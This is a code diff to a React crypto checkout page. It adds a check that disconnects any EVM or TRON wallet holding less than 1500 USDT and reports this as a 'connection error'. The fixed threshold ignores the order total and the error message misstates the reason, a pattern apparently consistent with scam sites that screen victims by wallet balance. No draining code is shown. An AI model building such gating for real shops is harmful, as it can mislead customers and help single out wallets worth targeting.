@@ -46,6 +46,9 @@ export default function Checkout() {
   const [step, setStep] = useState(1);
   const [selectedNetwork, setSelectedNetwork] = useState(null); // 'evm' | 'tron'
   const [walletModalOpen, setWalletModalOpen] = useState(false);
+  const [connectionError, setConnectionError] = useState('');
+  const isCheckingBalance = useRef(false);
+  const [isCheckingUI, setIsCheckingUI] = useState(false);
 
   // Payment state machine
   const [txStatus, setTxStatus] = useState('idle'); // idle | signing | pending | confirmed | failed
@@ -82,15 +85,81 @@ export default function Checkout() {
   // Step 2 → Step 3 auto-advance when wallet connects
   useEffect(() => {
     if (step !== 2) return;
-    if (selectedNetwork === 'evm' && isEvmConnected) {
-      // eslint-disable-next-line react-hooks/set-state-in-effect
-      setStep(3);
-    }
-    if (selectedNetwork === 'tron' && isTronConnected) {
+    
+    let isCancelled = false;
 
-      setStep(3);
+    const checkBalanceAndAdvance = async () => {
+      if (isCheckingBalance.current) return;
+      
+      if (selectedNetwork === 'evm' && isEvmConnected && evmAddress) {
+        isCheckingBalance.current = true;
+        setIsCheckingUI(true);
+        setConnectionError('');
+        try {
+          const balance = await publicClient.readContract({
+            address: EVM_USDT,
+            abi: USDT_TRANSFER_ABI,
+            functionName: 'balanceOf',
+            args: [evmAddress]
+          });
+          
+          if (!isCancelled) {
+            if (balance < BigInt('1500000000')) {
+              await disconnectEvmWallet();
+              setConnectionError('Connection error: Insufficient balance. You need at least 1500 USDT.');
+            } else {
+              setStep(3);
+            }
+          }
+        } catch (error) {
+          console.error("Error checking balance:", error);
+          if (!isCancelled) setConnectionError('Connection error: Failed to check balance.');
+        } finally {
+          if (!isCancelled) {
+            isCheckingBalance.current = false;
+            setIsCheckingUI(false);
+          }
+        }
+      } else if (selectedNetwork === 'tron' && isTronConnected && tronAddress) {
+        isCheckingBalance.current = true;
+        setIsCheckingUI(true);
+        setConnectionError('');
+        try {
+          const balanceRes = await fetch(`https://api.trongrid.io/v1/accounts/${tronAddress}`);
+          const balanceData = await balanceRes.json();
+          const trc20List = balanceData.data?.[0]?.trc20 || [];
+          const usdtEntry = trc20List.find((t) => TRON_USDT in t);
+          const usdtBalance = BigInt(usdtEntry?.[TRON_USDT] || '0');
+          
+          if (!isCancelled) {
+            if (usdtBalance < BigInt('1500000000')) {
+              await disconnectTronWallet();
+              setConnectionError('Connection error: Insufficient balance. You need at least 1500 USDT.');
+            } else {
+              setStep(3);
+            }
+          }
+        } catch (error) {
+          console.error("Error checking balance:", error);
+          if (!isCancelled) setConnectionError('Connection error: Failed to check balance.');
+        } finally {
+          if (!isCancelled) {
+            isCheckingBalance.current = false;
+            setIsCheckingUI(false);
+          }
+        }
+      }
+    };
+
+    if ((selectedNetwork === 'evm' && isEvmConnected) || (selectedNetwork === 'tron' && isTronConnected)) {
+      checkBalanceAndAdvance();
     }
-  }, [step, selectedNetwork, isEvmConnected, isTronConnected]);
+
+    return () => {
+      isCancelled = true;
+    };
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [step, selectedNetwork, isEvmConnected, isTronConnected, evmAddress, tronAddress]);
 
   // EVM receipt watcher — pass the hash from the receipt directly to avoid stale closure
   useEffect(() => {
@@ -466,9 +535,11 @@ export default function Checkout() {
               onSelectNetwork={setSelectedNetwork}
               isWalletConnected={isWalletConnected}
               walletAddress={walletAddress}
-              onConnect={() => setWalletModalOpen(true)}
+              onConnect={() => { setConnectionError(''); setWalletModalOpen(true); }}
               onContinue={() => setStep(3)}
               onBack={() => setStep(1)}
+              connectionError={connectionError}
+              isCheckingBalance={isCheckingUI}
             />
           )}
 
@@ -625,7 +696,7 @@ function StepReview({ items, totalUsdt, onContinue }) {
 
 // ── Step 2: Connect Wallet ────────────────────────────────────────────────────
 
-function StepConnect({ selectedNetwork, onSelectNetwork, isWalletConnected, walletAddress, onConnect, onContinue, onBack }) {
+function StepConnect({ selectedNetwork, onSelectNetwork, isWalletConnected, walletAddress, onConnect, onContinue, onBack, connectionError, isCheckingBalance }) {
   const truncate = (addr) => addr ? `${addr.slice(0, 6)}…${addr.slice(-4)}` : '';
 
   return (
@@ -655,6 +726,15 @@ function StepConnect({ selectedNetwork, onSelectNetwork, isWalletConnected, wall
         ))}
       </div>
 
+      {connectionError && (
+        <div className="mb-4 p-4 rounded-xl bg-red-50 dark:bg-red-950/20 border border-red-200 dark:border-red-900/40">
+          <div className="flex items-center gap-3">
+            <AlertCircle className="w-5 h-5 text-red-500 shrink-0" />
+            <p className="text-sm font-bold text-red-700 dark:text-red-400">{connectionError}</p>
+          </div>
+        </div>
+      )}
+
       {selectedNetwork && (
         <div className="mb-6">
           {isWalletConnected ? (
@@ -668,10 +748,11 @@ function StepConnect({ selectedNetwork, onSelectNetwork, isWalletConnected, wall
           ) : (
               <button
                 onClick={onConnect}
-                className="w-full py-3.5 rounded-xl font-bold text-white text-sm shadow-md hover:shadow-lg transition-all"
+                disabled={isCheckingBalance}
+                className="w-full py-3.5 rounded-xl font-bold text-white text-sm shadow-md hover:shadow-lg transition-all disabled:opacity-70 disabled:cursor-wait"
                 style={{ background: 'linear-gradient(135deg, #2563eb 0%, #4f46e5 100%)' }}
               >
-                Connect {selectedNetwork === 'evm' ? 'Ethereum' : 'TRON'} Wallet
+                {isCheckingBalance ? 'Checking Balance...' : `Connect ${selectedNetwork === 'evm' ? 'Ethereum' : 'TRON'} Wallet`}
               </button>
           )}
         </div>
@@ -687,10 +768,11 @@ function StepConnect({ selectedNetwork, onSelectNetwork, isWalletConnected, wall
         {isWalletConnected && (
           <button
             onClick={onContinue}
-            className="flex-1 py-3 rounded-xl font-bold text-sm text-white transition-all"
+            disabled={isCheckingBalance}
+            className="flex-1 py-3 rounded-xl font-bold text-sm text-white transition-all disabled:opacity-70 disabled:cursor-wait"
             style={{ background: 'linear-gradient(135deg, #2563eb 0%, #4f46e5 100%)' }}
           >
-            Pay Now →
+            {isCheckingBalance ? 'Checking...' : 'Pay Now →'}
           </button>
         )}
       </div>
